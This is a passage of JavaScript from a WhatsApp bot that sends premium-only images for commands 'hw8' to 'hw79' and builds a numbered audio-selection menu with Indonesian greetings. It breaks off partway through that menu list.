haikal.sendMessage(from, { image: hw8,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw9': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw9,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw10': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw10,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw11': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw11,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw12': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw12,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw13': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw13,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw14': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw14,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw15': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw15,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw16': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw16,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw17': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw17,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw18': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw18,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw19': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw19,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw20': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw20,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw21': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw21,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw22': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw22,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw23': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw23,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw24': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw24,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw25': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw25,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw26': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw26,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw27': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw27,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw28': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw28,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw29': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw29,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw30': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw30,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw31': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw31,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw32': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw32,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw33': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw33,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw34': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw34,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw35': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw35,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw36': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw36,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw37': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw37,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw38': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw38,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw39': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw39,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw40': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw40,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw41': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw41,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw42': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw42,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw43': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw43,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw44': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw44,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw45': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw45,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw46': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw46,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw47': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw47,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw48': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw48,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw49': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw49,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw50': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw50,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw51': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw51,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw52': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw52,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw53': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw53,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw54': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw54,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw55': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw55,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw56': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw56,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw57': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw57,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw58': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw58,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw59': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw59,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw60': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw60,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw61': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw61,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw62': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw62,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw63': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw63,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw64': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw64,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw65': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw65,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw66': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw66,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw67': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw67,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw68': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw68,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw69': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw69,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw70': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw70,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw71': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw71,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw72': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw72,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw73': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw73,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw74': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw74,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw75': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw75,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw76': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw76,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw77': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw77,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw78': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw78,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw79': {
if (!isPrem) return replyprem(mess.premium)
haikal.sendMessage(from, { image: hw79,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
//=================================================//
case 'listaudio':
touchmebree = [
{
title: `©️ sound MODS WA`,
rows: [
{title: `AUDIO 1`, rowId: `${prefix}sound1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 2`, rowId: `${prefix}sound2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 3`, rowId: `${prefix}sound3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 4`, rowId: `${prefix}sound4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 5`, rowId: `${prefix}sound5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 6`, rowId: `${prefix}sound6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 7`, rowId: `${prefix}sound7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 8`, rowId: `${prefix}sound8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 9`, rowId: `${prefix}sound9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 10`, rowId: `${prefix}sound10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 11`, rowId: `${prefix}sound11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 12`, rowId: `${prefix}sound12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 13`, rowId: `${prefix}sound13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 14`, rowId: `${prefix}sound14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 15`, rowId: `${prefix}sound15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 16`, rowId: `${prefix}sound16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 17`, rowId: `${prefix}sound17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 18`, rowId: `${prefix}sound18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 19`, rowId: `${prefix}sound19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 20`, rowId: `${prefix}sound20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 21`, rowId: `${prefix}sound21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 22`, rowId: `${prefix}sound22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 23`, rowId: `${prefix}sound23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 24`, rowId: `${prefix}sound24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 25`, rowId: `${prefix}sound25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 26`, rowId: `${prefix}sound26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 27`, rowId: `${prefix}sound27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 28`, rowId: `${prefix}sound28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 29`, rowId: `${prefix}sound29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 30`, rowId: `${prefix}sound30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 31`, rowId: `${prefix}sound31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 32`, rowId: `${prefix}sound32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 33`, rowId: `${prefix}sound33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 34`, rowId: `${prefix}sound34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 35`, rowId: `${prefix}sound35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 36`, rowId: `${prefix}sound36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 37`, rowId: `${prefix}sound37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 38`, rowId: `${prefix}sound38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 39`, rowId: `${prefix}sound39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 40`, rowId: `${prefix}sound40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 41`, rowId: `${prefix}sound41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 42`, rowId: `${prefix}sound42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 43`, rowId: `${prefix}sound43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 44`, rowId: `${prefix}sound44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 45`, rowId: `${prefix}sound45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 46`, rowId: `${prefix}sound46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 47`, rowId: `${prefix}sound47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 48`, rowId: `${prefix}sound48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 49`, rowId: `${prefix}sound49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 50`, rowId: `${prefix}sound50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 51`, rowId: `${prefix}sound51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 52`, rowId: `${prefix}sound52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 53`, rowId: `${prefix}sound53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 54`, rowId: `${prefix}sound54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 55`, rowId: `${prefix}sound55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 56`, rowId: `${prefix}sound56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 57`, rowId: `${prefix}sound57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 58`, rowId: `${prefix}sound58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 59`, rowId: `${prefix}sound59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 60`, rowId: `${prefix}sound60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 61`, rowId: `${prefix}sound61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 62`, rowId: `${prefix}sound62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 63`, rowId: `${prefix}sound63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 64`, rowId: `${prefix}sound64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 65`, rowId: `${prefix}sound65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 66`, rowId: `${prefix}sound66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 67`, rowId: `${prefix}sound67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 68`, rowId: `${prefix}sound68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 69`, rowId: `${prefix}sound69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 70`, rowId: `${prefix}sound70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 71`, rowId: `${prefix}sound71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 72`, rowId: `${prefix}sound72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 73`, rowId: `${prefix}sound73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 74`, rowId: `${prefix}sound74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 75`, rowId: `${prefix}sound75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 76`, rowId: `${prefix}sound76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 77`, rowId: `${prefix}sound77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 78`, rowId: `${prefix}sound78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 79`, rowId: `${prefix}sound99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 80`, rowId: `${prefix}sound80`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 81`, rowId: `${prefix}sound81`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 82`, rowId: `${prefix}sound82`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 83`, rowId: `${prefix}sound83`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 84`, rowId: `${prefix}sound84`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 85`, rowId: `${prefix}sound85`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 86`, rowId: `${prefix}sound86`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 87`, rowId: `${prefix}sound87`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 88`, rowId: `${prefix}sound88`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 89`, rowId: `${prefix}sound89`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 90`, rowId: `${prefix}sound90`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 91`, rowId: `${prefix}sound91`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 92`, rowId: `${prefix}sound92`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 93`, rowId: `${prefix}sound93`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 94`, rowId: `${prefix}sound94`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 95`, rowId: `${prefix}sound95`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 96`, rowId: `${prefix}sound96`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 97`, rowId: `${prefix}sound97`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 98`, rowId: `${prefix}sound98`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 99`, rowId: `${prefix}sound99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 100`, rowId: `${prefix}sound100`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 101`, rowId: `${prefix}sound101`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 102`, rowId: `${prefix}sound102`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 103`, rowId: `${prefix}sound103`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 104`, rowId: `${prefix}sound104`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 105`, rowId: `${prefix}sound105`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 106`, rowId: `${prefix}sound106`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 107`, rowId: `${prefix}sound107`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 108`, rowId: `${prefix}sound108`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 109`, rowId: `${prefix}sound109`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 110`, rowId: `${prefix}sound110`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 111`, rowId: `${prefix}sound111`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 112`, rowId: `${prefix}sound113`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 114`, rowId: `${prefix}sound114`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 115`, rowId: `${prefix}sound115`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 116`, rowId: `${prefix}sound116`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 117`, rowId: `${prefix}sound117`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 118`, rowId: `${prefix}sound118`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 119`, rowId: `${prefix}sound119`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 120`, rowId: `${prefix}sound120`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 121`, rowId: `${prefix}sound121`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 122`, rowId: `${prefix}sound122`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 123`, rowId: `${prefix}sound123`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 124`, rowId: `${prefix}sound124`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 125`, rowId: `${prefix}sound125`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 126`, rowId: `${prefix}sound126`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 127`, rowId: `${prefix}sound127`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 128`, rowId: `${prefix}sound128`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 129`, rowId: `${prefix}sound129`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 130`, rowId: `${prefix}sound130`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 131`, rowId: `${prefix}sound131`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `AUDIO 132`, rowId: `${prefix}sound132`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `AUDIO 133`, rowId: `${prefix}sound133`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 134`, rowId: `${prefix}sound134`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 135`, rowId: `${prefix}sound135`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 136`, rowId: `${prefix}sound136`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 137`, rowId: `${prefix}sound137`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 138`, rowId: `${prefix}sound138`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 139`, rowId: `${prefix}sound139`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 140`, rowId: `${prefix}sound140`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 141`, rowId: `${prefix}sound141`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `AUDIO 142`, rowId: `${prefix}sound142`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 143`, rowId: `${prefix}sound143`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `AUDIO 144`, rowId: `${prefix}sound144`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 145`, rowId: `${prefix}sound145`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `AUDIO 146`, rowId: `${prefix}sound146`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
